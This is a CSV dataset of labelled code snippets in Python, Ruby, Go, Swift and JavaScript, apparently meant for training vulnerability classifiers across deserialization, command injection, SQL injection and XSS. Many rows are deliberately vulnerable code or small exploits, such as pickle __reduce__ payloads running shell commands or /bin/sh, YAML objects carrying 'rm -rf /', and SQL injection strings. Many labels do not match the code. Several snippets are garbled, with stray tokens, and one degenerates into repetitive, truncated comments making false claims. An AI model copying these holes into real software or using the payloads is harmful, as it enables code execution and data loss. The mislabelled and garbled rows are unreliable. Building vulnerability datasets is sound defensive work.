snippet,label,source
"import Foundation

class User {
    var name: String?
}

func printUserName(user: User?) {
    if let name = user?.name {
        print(""User's name is \(name)"")
    } else {
        print(""No user found"")
    }
}

let user1 = User()
user1.name = ""John Doe""

printUserName(user: user1) // This will print ""User's name is John Doe""

let user2: User? = nil
printUserName(user: user2) // This will print ""No user found""",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import Foundation

func getUserInput() -> String {
    return ""Hello, %s""
}

func printFormattedString() {
    let userInput = getUserInput()
    let formattedString = String(format: userInput)
    print(formattedString)
}

printFormattedString()",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import os

def execute_command(user_input):
    # No sanitization is done here
    os.system(user_input)

user_input = input(""Enter your command: "")
execute_command(user_input)",CWE-78_CmdInjection,ayshajavd_hf_cybernative_dpo
"require 'rack/session/cookie'
require 'rack/session/abstract/id'

class MyApp
  attr_reader :request, :response

  def initialize(request, response)
    @request = request
    @response = response
  end

  def call(env)
    session_id = request.cookies['rack.session']
    session = env['rack.session'] ||= {}
    session[:user_id] ||= User.find_by_session_id(session_id).try(:id)
    # Vulnerable line: Session ID is stored in cookie and can be stolen
    response.set_cookie('rack.session', session_id) if session_id.present?
    [200, {}, ['Hello, World']]
  end
end

class User
  def self.find_by_session_id(session_id)
    # Dummy method
  end
end

use Rack::Session::Cookie, key: 'rack.session', path: '/', secret: 'secret'
run MyApp.new",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"package main

import (
	""errors""
	""fmt""
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println(""Recovered from panic:"", r)
		}
	}()

	someSecretFunction()
}

func someSecretFunction() {
	password := ""mySuperSecretPassword""
	err := errors.New(""Something went wrong"")
	panic(err)
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"class UserController < ApplicationController
  def show
    id = params[:id]
    @user = User.find_by(""email = '#{id}'"")
  end
end",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"import os

def evaluate_expression(expression):
    return eval(expression)

user_input = input(""Enter an expression: "")
print(evaluate_expression(user_input))",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"import time

def check_password(input_password):
    actual_password = ""secret""
    if len(input_password) != len(actual_password):
        return False
    for x, y in zip(input_password, actual_password):
        time.sleep(0.1)  # Simulate timing attack
        if x != y:
            return False
    return True

# Testing
input_password = ""secret""
start = time.time()
print(check_password(input_password))
end = time.time()
print(""Time taken: "", end - start)",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"import Foundation

func sendRequest(urlString: String) {
    guard let url = URL(string: urlString) else { return }
    let request = URLRequest(url: url)
    
    let task = URLSession.shared.dataTask(with: request) { data, response, error in
        if let data = data {
            print(String(data: data, encoding: .utf8) ?? ""Unable to convert data to string"")
        } else if let error = error {
            print(""Error: \(error)"")
        }
    }
    
    task.resume()
}

sendRequest(urlString: ""https://example.com/user=123"")",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized

vulnerable_object = VulnerableClass()
result = serialize_and_deserialize(vulnerable_object)
print(result)",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

pickled_data = pickle.dumps(EvilPickle())

# This will execute the command 'echo ""You have been hacked!""'
unpickled_data = pickle.loads(pickled_data)",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import os

def execute_command(user_input):
    os.system(user_input)

execute_command(input(""Enter your command: ""))",CWE-78_CmdInjection,ayshajavd_hf_cybernative_dpo
"package main

import (
	""fmt""
	""net/http""
)

func indexHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	fmt.Fprintf(w, ""Hello, %s"", r.Form[""username""][0])
}

func main() {
	http.HandleFunc(""/"", indexHandler)
	http.ListenAndServe("":8080"", nil)
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo Attacker has been hacked > /tmp/hacked',))

def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized

vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('cmd /c calc',))

def serialize(obj):
    return pickle.dumps(obj)

def deserialize(serialized_data):
    return pickle.loads(serialized_data)

# Vulnerable code
deserialize(serialize(RCE()))",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import sqlite3

def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='%s'"" % username
    cursor.execute(query)
    return cursor.fetchone()

# Example usage
print(get_user_info(""john""))",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"package main

import ""fmt""

func main() {
    defer fmt.Println(""First Defer"")
    defer fmt.Println(""Second Defer"")
    defer fmt.Println(""Third Defer"")

    fmt.Println(""Main Function"")
}",CWE-78_CmdInjection,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""sync""
)

var counter int = 0

func increment(wg *sync.WaitGroup) {
	defer wg.Done()overed
	for i := 0; i < 1000; i++ {
		counter++
	}
}

func main() {
	var wg sync.WaitGroup
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go increment(&wg)
	}
	wg.Wait()
	fmt.Println(""Counter value:"", counter)
}",CWE-78_CmdInjection,ayshajavd_hf_labeled_dataset
"require 'yaml'

class EvilObject
  def initialize
    @command = ""system('rm -rf /')""
  end
end

object = EvilObject.new
serialized_object = YAML::dump(object)
deserialized_object = YAML::load(serialized_object)
eval(deserialized_object.instance_variable_get(:@command))",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import os
def evaluate_input(user_input):
    return eval(user_input)

user_input = input(""Enter a command: "")
evaluate_input(user_input)",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"package main

import (
	""encoding/json""
	""fmt""
)

type User struct {
	Name string `json:""name""`
	Age  int    `json:""age""`
}

func main() {
	data := []byte(`{""name"":""John"",""age"":""twenty""}`) // Unexpected string type for age
	var u User
	err := json.Unmarshal(data, &u)
	if err != nil {
		fmt.Println(""Error:"", err)Bs
	}
	fmt.Println(u)
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"def search_users(query)
  User.where(""username = '#{query}'"")
end

search_users(""admin' OR '1'='1"")",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"import sqlite3

def fetch_user_data(username):
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()

    # User input is directly used to construct SQL queries
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)

    cursor.execute(query)
    rows = cursor.fetchall()

    for row in rows:
        print(row)

# Vulnerable call
fetch_user_data(""admin' OR '1'='1"")",CWE-89_SQLi,ayshajavd_hf_cybernative_dpo
"require 'yaml'

class UnsafeUser
  attr_accessor :name, :email

  def initialize(name, email)
    @name = name
    @email = email
  end
end

user_data = ""!!ruby/object:UnsafeUser\nname: User1\nemail: user1@example.com""

user = YAML.load(user_data)
puts user.inspect",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""net/http""
	""io/ioutil""
)

func main() {
	resp, err := http.Get(""https://api.example.com/endpoint"")
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(body))
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

def serialize_and_dump():
    evil = EvilPickle()
    with open('evil.pkl', 'wb') as f:
        pickle.dump(evil, f)

def load_and_deserialize():
    with open('evil.pkl', 'rb') as f:
        pickle.load(f)

serialize_and_dump()
load_and_deserialize()",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import sqlite3

def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    
    user_info = cursor.fetchone()
    return user_info

# Testing the function
print(get_user_info(""john""))",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))

pickled = pickle.dumps(RCE())
print(pickled)

deserialized = pickle.loads(pickled)",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"package main

import (
	""encoding/gob""
	""fmt""
	""os""
)

type User struct {
	Name string
	Age  int
}

func main() {
	user := User{Name: ""John Doe"", Age: 30}
	file, err := os.Create(""user.gob"")
	if err != nil {
		fmt.Println(err)
		return
	}
	encoder := gob.NewEncoder(file)
	err = encoder.Encode(user)
	if err != nil {
		fmt.Println(err)
		return
	}
	file.Close()

	file, err = os.Open(""user.gob"")
	if err != nil {
		fmt.Println(err)
		return
	}
	decoder := gob.NewDecoder(file)
	var newUser User
	err = decoder.Decode(&newUser)
	if err != nil {
		fmt.Println(err)
		return
	}
	file.Close()

	fmt.Printf(""Name: %v, Age: %v\n"", newUser.Name, newUser.Age)
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    user_info = cursor.fetchone()
    return user_info",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"import Foundation

enum MyError: Error {
    case invalidInput
}

func processData(_ data: String) throws -> String {
    guard let number = Int(data) else {
        throw MyError.invalidInput
    }
    
    return ""Processed \(number)""
}

DispatchQueue.global().async {
    do {
        let result = try processData(""Hello World"")
        print(result)
    } catch {
        print(""An error occurred: \(error)"")
    }
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import Foundation

enum MyError: Error {
    case invalidInput(String)
}

func dangerousFunction() throws -> String {
    let secret = ""SensitiveData""
    guard let input = FileManager.default.contents(atPath: ""/path/to/file"") else {
        throw MyError.invalidInput(""Failed to read file"")
    }
    return String(data: input, encoding: .utf8)!
}

do {
    let result = try dangerousFunction()
    print(result)
} catch let error as MyError {
    switch error {
    case .invalidInput(let message):
        print(""Invalid input: \(message)"")
    }
} catch {
    print(""Unexpected error: \(error)"")
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

def serialize_exploit():
    serialized = pickle.dumps(EvilPickle())
    with open('pickled_exploit', 'wb') as file:
        file.write(serialized)

def deserialize_exploit():
    with open('pickled_exploit', 'rb') as file:
        pickle.load(file)

serialize_exploit()
deserialize_exploit()",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""This is an arbitrary command execution""',))

def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    obj = pickle.loads(data)
    return obj

serialize_and_deserialize()",CWE-502_InsecureDeser,ayshajavd_hf_cybernative_dpo
"import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

def serialize_and_deserialize(vuln_obj):
    serialized = pickle.dumps(vuln_obj)
    deserialized = pickle.loads(serialized)
    return deserialized

vuln_obj = VulnerableClass()
deserialized_obj = serialize_and_deserialize(vuln_obj)",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"require 'cgi'

def run_command(user_input)
  cleaned_input = CGI.escape(user_input) # This line escapes special characters in the user input
  system(""echo #{cleaned_input} > output.txt"") # This line runs a system command using the user input
end

run_command(""Some user input; malicious command here"")",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"require 'active_record'

class User < ActiveRecord::Base
  def self.find_by_username(username)
    query = ""SELECT * FROM users WHERE username = '#{username}'""
    find_by_sql(query)
  end
end

# This will cause SQL injection
User.find_by_username(""test' OR '1'='1"")",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"import sqlite3

def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    
    query = ""SELECT * FROM users WHERE username='"" + username + ""'""
    cursor.execute(query)
    
    results = cursor.fetchall()
    
    return results

print(get_user_info(""test')) OR '1'='1""))",CWE-89_SQLi,ayshajavd_hf_cybernative_dpo
"import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))

def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(EvilClass(), f)

serialize_exploit()",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo ""Remote Code Execution""',))

def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(Exploit(), f)

serialize_exploit()",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"def str_manipulation(s):
    return s.encode('utf-8')

str_manipulation(""你好"")",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import Foundation

class Animal {
    var name: String
    
    init(name: String) {
        self.name = name
    }
}

class Dog: Animal {
    var barkVolume: Int
    
    init(name: String, barkVolume: Int) {
        self.barkVolume = barkVolume
        super.init(name: name)
    }
}

let animal = Animal(name: ""Generic Animal"")
let dog = Dog(name: ""Fido"", barkVolume: 10)

func printAnimalName(animal: Animal) {
    print(""The animal's name is \(animal.name)"")
}

printAnimalName(animal: animal) // This will work as expected

// Uncomment the following line to demonstrate the vulnerability
// printAnimalName(animal: dog) // This will crash at runtime because `dog` is actually an instance of `Dog`, not `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as Animal) // This will fail at compile time because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as AnyObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as NSObject as Animal) // This will fail at runtime because `Dog` is not a subtype of `Animal`

// To fix the issue, we need to downcast to `Dog` before accessing `barkVolume`
// printAnimalName(animal: dog as NSObject as AnyObject as NSObject as NSObject as NSObject as NSObject as NSObject as NS",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"class User
  attr_accessor :name, :password

  def initialize(name, password)
    @name = name
    @password = password
  end
end

user = User.new('John Doe', 'secret')

puts ""User #{user.name} has password #{user.password}""",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"require 'yaml'

class User
  attr_accessor :name
end

def load_user(data)
  YAML.load(data)
end

malicious_data = ""--- !ruby/object:User \nname: 'system(\""rm -rf /\"")'""
user = load_user(malicious_data)
user.name",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"require 'yaml'

class EvilObject
  def initialize
    @command = ""system('rm -rf /')""
  end
end

evil_object = EvilObject.new
serialize_object = YAML::dump(evil_object)
deserialized_object = YAML::load(serialize_object)
deserialized_object.instance_eval(@command)",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""net/http""
)

func handler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	fmt.Fprintf(w, ""Hello, %s"", r.Form.Get(""target""))
}

func main() {
	http.HandleFunc(""/"", handler)
	http.ListenAndServe("":8080"", nil)
}",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"require 'active_record'

class User < ActiveRecord::Base
  def self.find_by_username(username)
    where(""username = '#{username}'"")
  end
end

input = ""'; DROP TABLE users --""
User.find_by_username(input)",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"require 'pg'

def get_user_info(username)
  conn = PGconn.connect(:dbname => 'test')
  res  = conn.exec(""SELECT * FROM users WHERE username = '#{username}'"")
  res.each do |row|
    puts row
  end
ensure
  conn.close if conn
end

get_user_info(""admin' OR '1'='1' --"")",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"import Foundation

class User {
    var username: String
    var password: String
    
    init(username: String, password: String) {
        self.username = username
        self.password = password
    }
}

var users = [User]()

func registerUser(username: String, password: String) {
    let newUser = User(username: username, password: password)
    users.append(newUser)
}

func loginUser(username: String, password: String) -> Bool {
    for user in users {
        if user.username == username && user.password == password {
            return true
        }
    }
    return false
}

registerUser(username: ""admin"", password: ""password"")
if loginUser(username: ""admin"", password: ""password"") {
    print(""Login successful"")
} else {
    print(""Login failed"")
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data

serialize_and_deserialize()",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    
    user = cursor.fetchone()
    
    if user:
        return ""Logged in successfully"", 200
    else:
        return ""Invalid credentials"", 401

if __name__ == '__main__':
    app.run(debug=True)",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"package main

import (
	""fmt""
	""os""
)

type User struct {
	Name string
	Age  int
}

func main() {
	user := User{Name: ""John Doe"", Age: 30}
	fmt.Printf(""User: %v\n"", user)
}",CWE-78_CmdInjection,ayshajavd_hf_labeled_dataset
"import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))

vulnerable_object = VulnerableClass()
serialized_object = pickle.dumps(vulnerable_object)

deserialized_object = pickle.loads(serialized_object)",CWE-502_InsecureDeser,ayshajavd_hf_cybernative_dpo
"class UserController < ApplicationController
  def search
    @user = User.find_by(""username = '#{params[:username]}'"")
    render json: @user
  end
end",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"import pickle
import os

class TestClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""pwned"" > /tmp/pwn.txt',))

data = pickle.dumps(TestClass())

print(pickle.loads(data))",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"import sqlite3
def fetch_user_data(username):
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    user_data = cursor.fetchone()
    return user_data",CWE-89_SQLi,ayshajavd_hf_cybernative_dpo
"import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))

def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    pickle.loads(data)

serialize_and_deserialize()",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"// Import required modules
const express = require('express');
const bodyParser = require('body-parser');

// Create Express server
const app = express();

// Use body parser middleware
app.use(bodyParser.urlencoded({ extended: false }));

// Define routes
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  res.send(`Comment received: ${comment}`);
});

// Start server
app.listen(3000, () => console.log('Server started on port 3000'));",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)

def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        pickle.load(f)

serialize_exploit()
deserialize_exploit()",CWE-502_InsecureDeser,ayshajavd_hf_cybernative_dpo
"import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))

def serialize_and_deserialize():
    serialized = pickle.dumps(EvilClass())
    deserialized = pickle.loads(serialized)
    return deserialized

if __name__ == '__main__':
    serialize_and_deserialize()",CWE-502_InsecureDeser,ayshajavd_hf_cybernative_dpo
"import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/search', methods=['GET'])
def search():
    query = request.args.get('q')
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    cursor.execute(f""SELECT * FROM users WHERE username='{query}'"")
    results = cursor.fetchall()
    return str(results)

if __name__ == '__main__':
    app.run(debug=True)",CWE-89_SQLi,ayshajavd_hf_cybernative_dpo
"import flask

app = flask.Flask(__name__)

@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.get_json()
    result = eval(data['expression'])
    return str(result)

if __name__ == '__main__':
    app.run(debug=True)",CWE-89_SQLi,ayshajavd_hf_labeled_dataset
"import sqlite3
import os

def create_user(username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""INSERT INTO users (username, password) VALUES ('{}', '{}')"".format(username, password)
    c.execute(query)
    conn.commit()
    conn.close()

def login(username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    c.execute(query)
    user = c.fetchone()
    conn.close()
    if user:
        return True
    else: Hawkin-Sparrow
        return False

if __name__ == ""__main__"":
    create_user(""admin"", ""password"")
    print(login(""admin"", ""password"")) # This will print: True
    print(login(""admin"", ""' OR ''='"")) # This will print: True",CWE-89_SQLi,ayshajavd_hf_cybernative_dpo
"import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""pwned"" > /tmp/pwned',))

evil_pickle = pickle.dumps(EvilPickle())
pickle.loads(evil_pickle)",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/redirect')
def unsafe_redirect():
    url = request.args.get('url')
    return redirect(url)

if __name__ == ""__main__"":
    app.run(debug=True)",CWE-79_XSS,ayshajavd_hf_labeled_dataset
"import Foundation

enum MyError: Error {
    case unwrappedNil
}

func unwrapOptional(_ value: Int?) throws -> Int {
    guard let unwrappedValue = value else {
        throw MyError.unwrappedNil
    }
    return unwrappedValue
}

do {
    let result = try unwrapOptional(nil)
    print(result)
} catch let error as MyError {
    switch error {
    case .unwrappedNil:
        print(""Unwrapped nil value"")
    }
} catch {
    print(""Unexpected error: \(error)"")
}",CWE-502_InsecureDeser,ayshajavd_hf_labeled_dataset
"package main

import (
	""io/ioutil""
	""net/http""
	""fmt""
)

func main() {
	url := ""http://example.com/""
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println(""Error making request:"", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(""Error reading response body:"", err)
		return
	}

	fmt.Println(string(body))
}",CWE-79_XSS,ayshajavd_hf_labeled_dataset
